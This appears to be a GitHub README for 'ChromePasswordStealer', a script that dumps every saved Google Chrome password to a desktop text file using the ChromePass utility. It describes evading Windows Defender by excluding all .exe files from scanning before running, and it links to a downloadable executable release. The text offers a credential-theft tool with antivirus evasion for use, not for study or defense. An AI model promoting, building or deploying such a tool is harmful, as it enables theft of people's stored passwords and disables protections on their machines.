# ChromePasswordStealer

A simple script that outputs all passwords in Google Chrome to a text file on the desktop. 

Uses [ChromePass](https://www.nirsoft.net/utils/chromepass.html) to output passwords.

The script is designed to remain undetected by Windows Defender and only Windows Defender on Windows 10, by excluding all .exe files from detection before running, because under normal circumstances ChromePass is detected as a hacktool.

You can find the executable version [here](https://github.com/aidenmitchell/ChromePasswordStealer/releases).
